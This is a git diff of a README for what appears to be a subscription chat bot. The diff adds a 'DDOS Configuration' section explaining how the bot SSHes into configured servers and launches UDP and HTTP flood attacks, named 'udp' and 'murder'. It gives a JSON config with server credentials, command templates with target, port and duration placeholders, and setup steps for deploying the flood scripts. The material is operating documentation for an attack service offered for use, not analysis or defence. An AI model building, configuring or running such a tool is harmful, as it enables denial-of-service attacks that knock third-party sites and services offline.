@@ -28,7 +28,7 @@ censys_apiid | Your [Censys](https://censys.io/)'s API ID
 censys_secret | Your [Censys](https://censys.io/)'s Secret Key
 
 Everything is absolutely free and you should not pay for access.
-If you want, you can go the extra mile and pay for the API usage for better performance etc.. But I do not recommend doing that.
+If you want to, you can go the extra mile and pay for the API usage for better performance etc.. But I do not recommend doing that.
 ### Setup & Run
 ```bash
 	pm2 start index.js
@@ -91,3 +91,66 @@ Command | Action
 Command | Action
 --- | --- 
 `redeem` | Redeem a token to subscribe
+## DDOS Configuration
+Everything is pretty straightforward.
+We have a `ddos.json` file that requires you to setup and config the servers and the methods.
+```bash
+	node ddos.json
+```
+### Concept
+The bot will simply ssh connect into the machines you tell it to, and execute specificed bash shells inside a screen session environment.
+### Server-side servers configuration
+You will need to put your server SSH login credentials so the bot can connect and execute the scripts.
+Simply change the following:
+```JSON
+	"servers" : [
+		{
+			"host" : "192.168.1.1",
+			"user" : "root",
+			"password" : "password"
+		},
+		{
+			"host" : "192.168.1.2",
+			"user" : "root",
+			"password" : "password"
+		}
+	],
+```
+If you just have one server, you can do:
+```JSON
+	"servers" : [
+		{
+			"host" : "192.168.1.1",
+			"user" : "root",
+			"password" : "password"
+		},
+	],
+```
+### Server-side methods configuration
+Now on to the methods, we have:
+```JSON
+	"methods" : [
+		{
+			"name" : "udp",
+			"command" : "node udp_flooder.js -i %1target1% -p %1port1% -t %1duration1% -m 1",
+			"description" : "L4 Node UDP ICMP Flood Attack (-ddos 192.168.1.1 80 60 udp)"
+		},
+		{
+			"name" : "murder",
+			"command" : "node murder.js %1target1% %1duration1%",
+			"description" : "L7 Node HTTP Flood Attack (-ddos http://google.com/ 0 60 murder)."
+		}
+	]
+```
+`name` and `command` fields are necessary while `description` is optional.
+**name** corresponds to `[method]` in the `-ddos` command, so when you type `-ddos ... [method]`, the bot will match `[method]` with the `name` in `ddos.json` and executes its' corresponding `commands`.
+**command** is the shell our bot is going to execute when it connects to the cluser of server.
+The parameters `%1target1%`, `%1port1%` and `%1duration1%` are replaced correspondingly with `[target]`, `[port]` and `[time/s]` when you initiate the `-ddos` command.
+### Servers/Machine configuration
+Everything is pretty straightforward.
+In `/files` there is a necessary file `stopdos.sh` that you have to copy into your machine, it is the bash shell file that will stop the screen session responsible for the ddos attack.
+Simply drag it into your machine/servers (the ones in `ddos.json`) and give it executable permissions.
+```bash
+	chmod +x stopdos.sh
+```
+This bot comes along with two scripts, one L4 and one L7, they are `udp` and `murder` respectively, if you're planning to use them, drag the contents of the following folders: `/files/udp/` and `/files/murder` onto your machine and that will be it.
